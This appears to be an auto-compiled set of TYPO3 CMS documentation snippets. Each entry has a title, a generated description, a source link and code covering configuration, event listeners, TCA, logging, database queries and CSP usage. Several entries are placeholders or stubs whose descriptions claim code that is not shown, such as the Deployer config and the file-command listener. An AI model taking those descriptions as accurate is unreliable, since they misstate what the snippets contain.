PHP\nCODE:\n```\n$GLOBALS['TYPO3_CONF_VARS']['SYS']['fal']['processors']['MyNewImageProcessor'] = [\n    'className' => \\MyVendor\\ExtensionName\\Resource\\Processing\\MyNewImageProcessor::class,\n    'before' => ['LocalImageProcessor'],\n];\n```\n\n----------------------------------------\n\nTITLE: Retrieving Workspace ID in TYPO3 PHP\nDESCRIPTION: This snippet demonstrates how to retrieve the UID of the currently accessed workspace using the Context API. The 'id' property returns an integer value representing the workspace ID.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/Context/Index.rst#2025-04-16_snippet_5\n\nLANGUAGE: php\nCODE:\n```\n$this->context->getPropertyFromAspect('workspace', 'id');\n```\n\n----------------------------------------\n\nTITLE: Implementing BlogController Class in TYPO3 CMS (PHP)\nDESCRIPTION: This code snippet defines the BlogController class for a TYPO3 blog extension. It includes a newAction method that prepares data for displaying a form to create a new blog. The method assigns the new blog object and a list of administrators to the view.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/CodeSnippets/Extbase/View/HtmlResponse.rst.txt#2025-04-16_snippet_0\n\nLANGUAGE: PHP\nCODE:\n```\nuse Psr\\Http\\Message\\ResponseInterface;\nuse T3docs\\BlogExample\\Domain\\Model\\Blog;\n\nclass BlogController extends AbstractController\n{\n    /**\n     * Displays a form for creating a new blog\n     */\n    public function newAction(?Blog $newBlog = null): ResponseInterface\n    {\n        $this->view->assignMultiple([\n            'newBlog' => $newBlog,\n            'administrators' => $this->administratorRepository->findAll(),\n        ]);\n        return $this->htmlResponse();\n    }\n}\n```\n\n----------------------------------------\n\nTITLE: Configuring Multi-Service User Fetching in TYPO3\nDESCRIPTION: Configuration to force the authentication process through all available services for user fetching, collecting all possible users instead of stopping at the first match.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/Authentication/AuthenticationService/Index.rst#2025-04-16_snippet_3\n\nLANGUAGE: php\nCODE:\n```\n$GLOBALS['TYPO3_CONF_VARS']['SVCONF']['auth']['setup']['BE_fetchAllUsers'] = true;\n$GLOBALS['TYPO3_CONF_VARS']['SVCONF']['auth']['setup']['FE_fetchAllUsers'] = true;\n```\n\n----------------------------------------\n\nTITLE: Deprecated CType SQL Reference\nDESCRIPTION: SQL references showing the deprecated CType value for General Plugin implementation in TYPO3 13.4.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ExtensionArchitecture/HowTo/FrontendPlugin/Index.rst#2025-04-16_snippet_0\n\nLANGUAGE: sql\nCODE:\n```\n'list'\n```\n\n----------------------------------------\n\nTITLE: Defining BeforeStylesheetsRenderingEvent Class in PHP for TYPO3 CMS\nDESCRIPTION: This snippet defines the BeforeStylesheetsRenderingEvent class within the TYPO3\\CMS\\Core\\Page\\Event namespace. The class is fired before stylesheets are rendered and provides methods to access the AssetCollector and check rendering properties.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/CodeSnippets/Events/Core/BeforeStylesheetsRenderingEvent.rst.txt#2025-04-16_snippet_0\n\nLANGUAGE: PHP\nCODE:\n```\n<?php\nnamespace TYPO3\\CMS\\Core\\Page\\Event;\n\nclass BeforeStylesheetsRenderingEvent\n{\n    public function getAssetCollector(): \\TYPO3\\CMS\\Core\\Page\\AssetCollector\n    {\n        // Implementation not shown\n    }\n\n    public function isInline(): bool\n    {\n        // Implementation not shown\n    }\n\n    public function isPriority(): bool\n    {\n        // Implementation not shown\n    }\n}\n```\n\n----------------------------------------\n\nTITLE: Implementing a Custom Event Listener for PackageInitializationEvent in PHP\nDESCRIPTION: This example shows how to create a custom event listener that reacts to package initialization events. The listener demonstrates how to access extension key information, check for specific extensions, and store custom data in the event.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/Events/Events/Core/Package/PackageInitializationEvent.rst#2025-04-16_snippet_0\n\nLANGUAGE: php\nCODE:\n```\n<?php\ndeclare(strict_types=1);\n\nnamespace MyVendor\\MyExtension\\Package\\EventListener;\n\nuse TYPO3\\CMS\\Core\\Attribute\\AsEventListener;\nuse TYPO3\\CMS\\Core\\Package\\Event\\PackageInitializationEvent;\n\nfinal class MyEventListener\n{\n    #[AsEventListener(\n        identifier: 'my-extension/package-initialization',\n    )]\n    public function __invoke(PackageInitializationEvent $event): void\n    {\n        // Get the extension key\n        $packageKey = $event->getPackageKey();\n\n        // Demonstrate event storage usage\n        if ($packageKey === 'my_custom_extension') {\n            $storageData = $event->getStorageEntry('core.database') ?? [];\n            // Do something with the storage data\n            $event->addStorageEntry('my_extension.custom_data', ['foo' => 'bar']);\n        }\n    }\n}\n\n```\n\n----------------------------------------\n\nTITLE: Registering Multiple MFA Providers in TYPO3 (YAML)\nDESCRIPTION: This snippet demonstrates how to register multiple MFA providers in TYPO3's Services.yaml file. It configures two providers with different identifiers and properties.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/Authentication/MultiFactorAuthentication/Index.rst#2025-04-16_snippet_6\n\nLANGUAGE: yaml\nCODE:\n```\nservices:\n  MyVendor\\MyExtension\\Authentication\\Mfa\\MyProvider:\n    tags:\n      - name: mfa.provider\n        identifier: 'my-provider'\n        title: 'LLL:EXT:my_extension/Resources/Private/Language/locallang.xlf:myProvider.title'\n        description: 'LLL:EXT:my_extension/Resources/Private/Language/locallang.xlf:myProvider.description'\n        setupInstructions: 'LLL:EXT:my_extension/Resources/Private/Language/locallang.xlf:myProvider.setupInstructions'\n        icon: 'EXT:my_extension/Resources/Public/Icons/my-provider.svg'\n  MyVendor\\MyExtension\\Authentication\\Mfa\\MyOtherProvider:\n    tags:\n      - name: mfa.provider\n        identifier: 'my-other-provider'\n        title: 'LLL:EXT:my_extension/Resources/Private/Language/locallang.xlf:myOtherProvider.title'\n        description: 'LLL:EXT:my_extension/Resources/Private/Language/locallang.xlf:myOtherProvider.description'\n        setupInstructions: 'LLL:EXT:my_extension/Resources/Private/Language/locallang.xlf:myOtherProvider.setupInstructions'\n        icon: 'EXT:my_extension/Resources/Public/Icons/my-other-provider.svg'\n```\n\n----------------------------------------\n\nTITLE: Creating New Record Link in PHP\nDESCRIPTION: Example of creating a new record link with default values using PHP UriBuilder.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/Backend/UriBuilder.rst#2025-04-16_snippet_3\n\nLANGUAGE: php\nCODE:\n```\n$uriBuilder = GeneralUtility::makeInstance(UriBuilder::class);\n$url = $uriBuilder->buildUriFromRoute(\n    'record_edit',\n    [\n        'edit' => [\n            'tx_examples_haiku' => [\n                1 => 'new',\n            ],\n        ],\n        'columnsOnly' => 'title,season',\n        'defVals' => [\n            'tx_examples_haiku' => [\n                'title' => 'New haiku',\n                'season' => 'Spring',\n            ],\n        ],\n        'returnUrl' => GeneralUtility::getIndpEnv('REQUEST_URI'),\n    ]\n);\n```\n\n----------------------------------------\n\nTITLE: Installing TYPO3 with Composer\nDESCRIPTION: Commands to create a new TYPO3 project using Composer. Supports installation of TYPO3 v13 with different environment options including bash, PowerShell and DDEV.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/Administration/Installation/Install.rst#2025-04-16_snippet_0\n\nLANGUAGE: bash\nCODE:\n```\ncomposer create-project typo3/cms-base-distribution example-project-directory \"^13\"\n```\n\nLANGUAGE: powershell\nCODE:\n```\ncomposer create-project \"typo3/cms-base-distribution:^13\" example-project-directory\n```\n\nLANGUAGE: bash\nCODE:\n```\nmkdir example-project-directory\ncd example-project-directory\nddev config --project-type=typo3 --docroot=public --php-version 8.2\nddev start\nddev composer create \"typo3/cms-base-distribution:^13\"\n```\n\n----------------------------------------\n\nTITLE: Declaring Foreign Service as Public in TYPO3\nDESCRIPTION: YAML configuration example showing how to make a foreign service public in the dependency injection container.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/DependencyInjection/Index.rst#2025-04-16_snippet_8\n\nLANGUAGE: yaml\nCODE:\n```\nservices:\n  Some\\Foreign\\Service:\n    public: true\n```\n\n----------------------------------------\n\nTITLE: Configuring a Custom Logger Channel in TYPO3\nDESCRIPTION: Example of configuring a custom logger channel in TYPO3 system configuration. This shows how to direct logs from a specific channel to a dedicated log file.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/Logging/Logger/Index.rst#2025-04-16_snippet_4\n\nLANGUAGE: php\nCODE:\n```\nuse Psr\\Log\\LogLevel;\nuse TYPO3\\CMS\\Core\\Core\\Environment;\nuse TYPO3\\CMS\\Core\\Log\\Writer\\FileWriter;\n\n$GLOBALS['TYPO3_CONF_VARS']['LOG']['security']['writerConfiguration'] = [\n    LogLevel::DEBUG => [\n        FileWriter::class => [\n            'logFile' => Environment::getVarPath() . '/log/security.log'\n        ]\n    ],\n];\n```\n\n----------------------------------------\n\nTITLE: Deployer Configuration for TYPO3 CMS\nDESCRIPTION: This is a sample deploy.php configuration file for Deployer when used with TYPO3 CMS. The actual code isn't shown in the input, but the documentation references that a literalinclude directive is used to include the deploy.php file.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/Administration/Installation/Deployment/Deployer/Index.rst#2025-04-16_snippet_0\n\nLANGUAGE: php\nCODE:\n```\n// The actual code content isn't provided in the input.\n// This would typically contain Deployer configuration directives\n// for deploying a TYPO3 CMS project.\n```\n\n----------------------------------------\n\nTITLE: Rendered HTML Output from Fluid Template\nDESCRIPTION: Shows the final HTML result after the Fluid template has been processed, with the variable replaced by its value.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/Fluid/Syntax.rst#2025-04-16_snippet_2\n\nLANGUAGE: html\nCODE:\n```\n<h1>An example title</h1>\n```\n\n----------------------------------------\n\nTITLE: Database Table Reference\nDESCRIPTION: Reference to the TYPO3 database table that stores file information and missing file status.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/Events/Events/Core/Resource/AfterFileMarkedAsMissingEvent.rst#2025-04-16_snippet_1\n\nLANGUAGE: sql\nCODE:\n```\nsys_file\n```\n\n----------------------------------------\n\nTITLE: Implementing setAction Method in PHP\nDESCRIPTION: This method adds a new action or overrides an existing one in the RecordList. It allows specifying the action's group and position relative to other actions.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/CodeSnippets/Events/Backend/ModifyRecordListRecordActionsEvent.rst.txt#2025-04-16_snippet_1\n\nLANGUAGE: PHP\nCODE:\n```\npublic function setAction(string $action, string $actionName = '', string $group = '', string $before = '', string $after = '')\n{\n    // Method implementation\n}\n```\n\n----------------------------------------\n\nTITLE: Injecting and Using Tea Repository in TYPO3 Extbase Controller\nDESCRIPTION: This snippet shows how to inject the TeaRepository into a controller using dependency injection and use it to retrieve all tea objects. It demonstrates the usage of the findAll() method inherited from the base Repository class.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ExtensionArchitecture/Tutorials/Tea/Repository.rst#2025-04-16_snippet_2\n\nLANGUAGE: PHP\nCODE:\n```\n<?php\ndeclare(strict_types=1);\n\nnamespace TTN\\Tea\\Controller;\n\nuse Psr\\Http\\Message\\ResponseInterface;\nuse TTN\\Tea\\Domain\\Repository\\Product\\TeaRepository;\nuse TYPO3\\CMS\\Extbase\\Mvc\\Controller\\ActionController;\n\nclass TeaController extends ActionController\n{\n    public function __construct(\n        private readonly TeaRepository $teaRepository\n    ) {\n    }\n\n    public function listAction(): ResponseInterface\n    {\n        $this->view->assign('teas', $this->teaRepository->findAll());\n        return $this->htmlResponse();\n    }\n}\n```\n\n----------------------------------------\n\nTITLE: TYPO3 File Command Event Listener Implementation\nDESCRIPTION: Example implementation of an event listener for the AfterFileCommandProcessedEvent. Shows the PHP class structure for handling file command processing events in TYPO3.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/Events/Events/Core/Resource/AfterFileCommandProcessedEvent.rst#2025-04-16_snippet_0\n\nLANGUAGE: php\nCODE:\n```\n\\TYPO3\\CMS\\Core\\Resource\\Event\\AfterFileCommandProcessedEvent\n```\n\n----------------------------------------\n\nTITLE: Querying with DeletedRestriction in PHP\nDESCRIPTION: Example of how the DeletedRestriction evaluates the TCA configuration and adds a WHERE clause to exclude deleted records.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/Database/RestrictionBuilder/Index.rst#2025-04-16_snippet_0\n\nLANGUAGE: PHP\nCODE:\n```\n['ctrl']['delete'] = 'deleted'\n```\n\nLANGUAGE: SQL\nCODE:\n```\nAND deleted = 0\n```\n\n----------------------------------------\n\nTITLE: Converting String to Integer with TYPO3 Extbase\nDESCRIPTION: This snippet demonstrates the conversion of a string to an integer using TYPO3's Extbase PropertyMapper. You must inject the PropertyMapper before use.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ExtensionArchitecture/Extbase/Reference/Controller/PropertyMapping.rst#2025-04-16_snippet_0\n\nLANGUAGE: php\nCODE:\n```\n\\include :: /CodeSnippets/Extbase/PropertyManager/IntegerMapping.rst.txt\n```\n\n----------------------------------------\n\nTITLE: Iterating Through a File Collection in a Fluid Template\nDESCRIPTION: This example shows how to iterate through a file collection in a Fluid template. Since file collections implement the PHP Iterator interface, they can be directly used in Fluid loops after their content has been loaded.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/Fal/UsingFal/ExamplesCollection.rst#2025-04-16_snippet_1\n\nLANGUAGE: html\nCODE:\n```\n<ul>\n    <f:for each=\"{collection}\" as=\"file\">\n        <li>{file.name}</li>\n    </f:for>\n</ul>\n\n```\n\n----------------------------------------\n\nTITLE: Extending tt_content Table with No Print Field in TYPO3\nDESCRIPTION: This example adds a 'No print' checkbox field to all content element types in the tt_content table. It includes both the SQL definition and TCA configuration for the new field.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ExtensionArchitecture/HowTo/ExtendingTca/Examples/Index.rst#2025-04-16_snippet_2\n\nLANGUAGE: sql\nCODE:\n```\nCREATE TABLE tt_content (\n\ttx_examples_noprint tinyint(4) DEFAULT '0' NOT NULL\n);\n```\n\nLANGUAGE: php\nCODE:\n```\n\\TYPO3\\CMS\\Core\\Utility\\ExtensionManagementUtility::addTCAcolumns(\n   'tt_content',\n   [\n      'tx_examples_noprint' => [\n         'exclude' => 0,\n         'label' => 'LLL:EXT:examples/Resources/Private/Language/locallang_db.xlf:tt_content.tx_examples_noprint',\n         'config' => [\n            'type' => 'check',\n            'renderType' => 'checkboxToggle',\n            'items' => [\n               [\n                  0 => '',\n                  1 => ''\n               ]\n            ],\n         ],\n      ],\n   ]\n);\n\\TYPO3\\CMS\\Core\\Utility\\ExtensionManagementUtility::addFieldsToPalette(\n   'tt_content',\n   'access',\n   'tx_examples_noprint',\n   'before:editlock'\n);\n```\n\n----------------------------------------\n\nTITLE: Checking TYPO3 Application Type in PHP\nDESCRIPTION: This code snippet demonstrates how to check the applicationType request attribute to determine if the current context is frontend or backend. A value of 1 indicates a frontend request, while any other value (typically 2) indicates a backend request.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/RequestLifeCycle/RequestAttributes/ApplicationType.rst#2025-04-16_snippet_0\n\nLANGUAGE: php\nCODE:\n```\n$applicationType = $request->getAttribute('applicationType');\nif ($applicationType === 1) {\n    // We are in frontend context\n} else {\n    // We are in backend context\n}\n```\n\n----------------------------------------\n\nTITLE: Configuring Multiple Database Connections and Table Mapping in TYPO3\nDESCRIPTION: This snippet shows how to configure multiple database connections, including the default connection and a separate connection for sessions. It also demonstrates how to map the `be_sessions` table to the `Sessions` connection, allowing it to reside in a different database or server.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/Configuration/Typo3ConfVars/DB.rst#2025-04-16_snippet_1\n\nLANGUAGE: php\nCODE:\n```\n\"Connections\" => [\n    'Default' => [\n        'charset' => 'utf8mb4',\n        'driver' => 'mysqli',\n        'dbname' => 'typo3_database',\n        'host' => '127.0.0.1',\n        'password' => '***',\n        'port' => 3306,\n        'user' => 'typo3',\n    ],\n    'Sessions' => [\n        'charset' => 'utf8mb4',\n        'driver' => 'mysqli',\n        'dbname' => 'sessions_dbname',\n        'host' => 'sessions_host',\n        'password' => '***',\n        'port' => 3306,\n        'user' => 'some_user',\n    ],\n],\n'TableMapping' => [\n    'be_sessions' => 'Sessions',\n]\n```\n\n----------------------------------------\n\nTITLE: Defining ModifyLoadedPageTsConfigEvent Class in TYPO3 CMS Core\nDESCRIPTION: This PHP class definition allows extensions to modify page TSconfig entries. It provides methods to get, add, and set TSconfig, as well as retrieve the root line.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/CodeSnippets/Events/Core/ModifyLoadedPageTsConfigEvent.rst.txt#2025-04-16_snippet_0\n\nLANGUAGE: php\nCODE:\n```\n<?php\nnamespace TYPO3\\CMS\\Core\\TypoScript\\IncludeTree\\Event;\n\nclass ModifyLoadedPageTsConfigEvent\n{\n    public function getTsConfig(): array\n    {\n        // Implementation not shown\n    }\n\n    public function addTsConfig(string $tsConfig): void\n    {\n        // Implementation not shown\n    }\n\n    public function setTsConfig(array $tsConfig): void\n    {\n        // Implementation not shown\n    }\n\n    public function getRootLine(): array\n    {\n        // Implementation not shown\n    }\n}\n```\n\n----------------------------------------\n\nTITLE: Implementing ModifyLinkExplanationEvent Listener in PHP\nDESCRIPTION: This code snippet demonstrates how to implement an event listener for the ModifyLinkExplanationEvent in TYPO3. It shows how to modify the link explanation and add additional attributes based on the link data.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/Events/Events/Backend/ModifyLinkExplanationEvent.rst#2025-04-16_snippet_0\n\nLANGUAGE: PHP\nCODE:\n```\n<?php\ndeclare(strict_types=1);\n\nnamespace MyVendor\\MyExtension\\Backend\\EventListener;\n\nuse TYPO3\\CMS\\Backend\\Form\\Event\\ModifyLinkExplanationEvent;\n\nfinal class MyEventListener\n{\n    public function __invoke(ModifyLinkExplanationEvent $event): void\n    {\n        $linkData = $event->getLinkData();\n        $linkParts = $event->getLinkParts();\n\n        if ($linkData['type'] === 'page' && ($pageUid = $linkData['pageuid'] ?? null)) {\n            $linkExplanation = $event->getLinkExplanation();\n            $linkExplanation['text'] = sprintf(\n                'Link to page %d',\n                $pageUid\n            );\n            $linkExplanation['additionalAttributes'] = sprintf(\n                '<p>URL: %s</p>',\n                $linkParts['url'] ?? ''\n            );\n            $event->setLinkExplanation($linkExplanation);\n        }\n    }\n}\n```\n\n----------------------------------------\n\nTITLE: Custom BitSet Class Implementation in TYPO3\nDESCRIPTION: Shows how to create a custom BitSet class extending TYPO3's BitSet for permissions management with defined constants.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/BitSets/Index.rst#2025-04-16_snippet_1\n\nLANGUAGE: php\nCODE:\n```\n<?php\n\ndeclare(strict_types=1);\n\nnamespace MyVendor\\MyExtension\\Bitmask;\n\nuse TYPO3\\CMS\\Core\\Type\\BitSet;\n\nclass Permissions extends BitSet\n{\n    private const NONE = 0b000;\n    private const READ = 0b001;\n    private const WRITE = 0b010;\n    private const DELETE = 0b100;\n\n    public static function create(): self\n    {\n        return new self(self::NONE);\n    }\n\n    public function setRead(): void\n    {\n        $this->set(self::READ);\n    }\n\n    public function canRead(): bool\n    {\n        return $this->get(self::READ);\n    }\n\n    public function setWrite(): void\n    {\n        $this->set(self::WRITE);\n    }\n\n    public function canWrite(): bool\n    {\n        return $this->get(self::WRITE);\n    }\n\n    public function setDelete(): void\n    {\n        $this->set(self::DELETE);\n    }\n\n    public function canDelete(): bool\n    {\n        return $this->get(self::DELETE);\n    }\n}\n```\n\n----------------------------------------\n\nTITLE: Validating Redirect URLs for Trusted Domains in TYPO3 Frontend Login\nDESCRIPTION: This example demonstrates an event listener that validates if a redirect URL after frontend login points to a trusted domain. It implements custom validation logic to ensure redirects only go to specific allowed domains.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/Events/Events/FrontendLogin/ModifyRedirectUrlValidationResultEvent.rst#2025-04-16_snippet_0\n\nLANGUAGE: php\nCODE:\n```\n<?php\n\ndeclare(strict_types=1);\n\nnamespace MyVendor\\MyExtension\\EventListeners;\n\nuse TYPO3\\CMS\\FrontendLogin\\Event\\ModifyRedirectUrlValidationResultEvent;\n\n/**\n * Validates if a redirect URL points to a trusted domain\n */\n#[\\TYPO3\\CMS\\Core\\Attribute\\AsEventListener]\nfinal class ValidateRedirectUrl\n{\n    /**\n     * @var array<int, string>\n     */\n    private array $trustedDomains = [\n        'trusted-domain.com',\n        'trusted-domain.org',\n    ];\n\n    /**\n     * Sets result to true if the redirect URL has a trusted domain\n     */\n    public function __invoke(ModifyRedirectUrlValidationResultEvent $event): void\n    {\n        $redirectUrl = $event->getRedirectUrl();\n        $host = parse_url($redirectUrl, PHP_URL_HOST);\n\n        foreach ($this->trustedDomains as $trustedDomain) {\n            if ($host === $trustedDomain) {\n                $event->setValidationResult(true);\n            }\n        }\n    }\n}\n\n```\n\n----------------------------------------\n\nTITLE: Registering Login Provider in TYPO3 Config\nDESCRIPTION: Configuration code to register a new login provider in TYPO3 backend. Defines provider class, sorting order, icon and label settings.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/Backend/LoginProvider.rst#2025-04-16_snippet_0\n\nLANGUAGE: php\nCODE:\n```\n$GLOBALS['TYPO3_CONF_VARS']['EXTCONF']['backend']['loginProviders'][1433416020] = [\n    'provider' => \\MyVendor\\MyExtension\\LoginProvider\\CustomLoginProvider::class,\n    'sorting' => 50,\n    'iconIdentifier' => 'actions-key',\n    'label' => 'LLL:EXT:backend/Resources/Private/Language/locallang.xlf:login.link'\n];\n```\n\n----------------------------------------\n\nTITLE: TCA Configuration for Custom Content Element Field\nDESCRIPTION: PHP configuration for adding a new field to the tt_content table TCA definition.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/ContentElements/AddingYourOwnContentElements.rst#2025-04-16_snippet_4\n\nLANGUAGE: php\nCODE:\n```\n<?php\nuse TYPO3\\CMS\\Core\\Utility\\ExtensionManagementUtility;\n\nExtensionManagementUtility::addTCAcolumns('tt_content',\n    array(\n        'tx_examples_separator' => array(\n            'exclude' => 0,\n            'label' => 'LLL:EXT:examples/Resources/Private/Language/locallang_db.xlf:tt_content.tx_examples_separator',\n            'config' => array(\n                'type' => 'input',\n                'size' => '30'\n            )\n        )\n    )\n);\n```\n\n----------------------------------------\n\nTITLE: Referencing TYPO3 ModifyFileReferenceEnabledControlsEvent\nDESCRIPTION: Shows the full PHP namespace reference for the ModifyFileReferenceEnabledControlsEvent class used in TYPO3 backend form handling. This event allows modification of enabled/disabled states for file reference controls.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/Events/Events/Backend/ModifyFileReferenceEnabledControlsEvent.rst#2025-04-16_snippet_0\n\nLANGUAGE: PHP\nCODE:\n```\n\\TYPO3\\CMS\\Backend\\Form\\Event\\ModifyFileReferenceEnabledControlsEvent\n```\n\n----------------------------------------\n\nTITLE: Using CSP nonce in Fluid templates\nDESCRIPTION: Examples of using Content Security Policy nonces in Fluid templates with various ViewHelpers.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/ContentSecurityPolicy/Index.rst#2025-04-16_snippet_10\n\nLANGUAGE: html\nCODE:\n```\n<script nonce=\"{f:security.nonce()}\">\n    const inline = 'script';\n</script>\n\n<style nonce=\"{f:security.nonce()}\">\n    .some-style { color: red; }\n</style>\n\n<f:asset.script identifier=\"my-inline-script\" useNonce=\"1\">\n    const inline = 'script';\n</f:asset.script>\n\n<f:asset.css identifier=\"my-inline-style\" useNonce=\"1\">\n    .some-style { color: red; }\n</f:asset.css>\n```\n\n----------------------------------------\n\nTITLE: Adding New Page Type to Doktype Selector\nDESCRIPTION: Modifies the TCA configuration to add the new Archive page type to the doktype selector dropdown menu and associates it with the configured icon.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/PageTypes/CreateNewPageType.rst#2025-04-16_snippet_3\n\nLANGUAGE: php\nCODE:\n```\ncall_user_func(static function () {\n    // Add new page types:\n    // Archive\n    $archiveDoktype = 116;\n\n    // Add as dropdown item:\n    \\TYPO3\\CMS\\Core\\Utility\\ExtensionManagementUtility::addTcaSelectItem(\n        'pages',\n        'doktype',\n        [\n            'Archive',\n            $archiveDoktype,\n            'apps-pagetree-archive',\n        ],\n        '1',\n        'after'\n    );\n\n    \\TYPO3\\CMS\\Core\\Utility\\ArrayUtility::mergeRecursiveWithOverrule(\n        $GLOBALS['TCA']['pages'],\n        [\n            'ctrl' => [\n                'typeicon_classes' => [\n                    $archiveDoktype => 'apps-pagetree-archive',\n                ],\n            ],\n        ]\n    );\n});\n```\n\n----------------------------------------\n\nTITLE: CSP Configuration Example for example.org\nDESCRIPTION: YAML configuration defining Content Security Policy rules for example.org domain\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/ContentSecurityPolicy/Index.rst#2025-04-16_snippet_2\n\nLANGUAGE: yaml\nCODE:\n```\n# config/sites/example-org/csp.yaml\nsections:\n  frontend:\n    # CSP directives\n\n```\n\n----------------------------------------\n\nTITLE: Instantiating a Class in TYPO3 CMS using GeneralUtility\nDESCRIPTION: Demonstrates the standard way to instantiate a class in TYPO3 CMS using the GeneralUtility::makeInstance method. This example creates an instance of ContentObjectRenderer.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/Services/Introduction/Index.rst#2025-04-16_snippet_0\n\nLANGUAGE: PHP\nCODE:\n```\nuse TYPO3\\CMS\\Core\\Utility\\GeneralUtility;\nuse TYPO3\\CMS\\Frontend\\ContentObject\\ContentObjectRenderer;\n\n$object = GeneralUtility::makeInstance(ContentObjectRenderer::class);\n```\n\n----------------------------------------\n\nTITLE: Retrieving Query Parameters with getParameters() in TYPO3\nDESCRIPTION: Shows how to use getParameters() method to retrieve the values for placeholders in a prepared statement. This is useful for verifying the final statement during development.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/Database/QueryBuilder/Index.rst#2025-04-16_snippet_26\n\nLANGUAGE: PHP\nCODE:\n```\n$queryBuilder = $this->connectionPool->getQueryBuilderForTable('sys_language');\n$queryBuilder\n    ->select('*')\n    ->from('sys_language');\ndebug($queryBuilder->getParameters());\n$statement = $queryBuilder->executeQuery();\n```\n\n----------------------------------------\n\nTITLE: Configuring logging for specific class and channel in TYPO3\nDESCRIPTION: This snippet demonstrates how to configure logging for a specific class (FalExampleController) and a specific channel (security) in TYPO3.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/Logging/Configuration/Index.rst#2025-04-16_snippet_2\n\nLANGUAGE: PHP\nCODE:\n```\n// For class \\T3docs\\Examples\\Controller\\FalExampleController\n$GLOBALS['TYPO3_CONF_VARS']['LOG']\n    ['T3docs']['Examples']['Controller']['FalExampleController']\n    ['writerConfiguration'] = [\n        // ...\n    ];\n\n// For channel \"security\"\n$GLOBALS['TYPO3_CONF_VARS']['LOG']['security']['writerConfiguration'] = [\n    // ...\n];\n```\n\n----------------------------------------\n\nTITLE: Defining Custom Permission Options in TYPO3 Backend\nDESCRIPTION: This snippet showcases how to define custom permission options within the TYPO3 backend via the `$GLOBALS['TYPO3_CONF_VARS']['BE']['customPermOptions']` array.  It illustrates the structure for defining a key with a header, and items with labels, icons, and descriptions. Keys cannot contain characters :|,.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/Configuration/Typo3ConfVars/BE.rst#2025-04-16_snippet_2\n\nLANGUAGE: php\nCODE:\n```\n\"'key' => array(\n    'header' => 'header string, language split',\n    'items' => array(\n       'key' => array('label, language split','icon reference', 'Description text, language split')\n    )\n)\" \n```\n\n----------------------------------------\n\nTITLE: JSON Structure for Context Menu Items\nDESCRIPTION: Example of the JSON structure returned by the ContextMenuController, which is used to render the context menu in JavaScript. It includes various item types and their properties.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/Backend/ContextualMenu.rst#2025-04-16_snippet_3\n\nLANGUAGE: JavaScript\nCODE:\n```\n{\n   \"view\":{\n      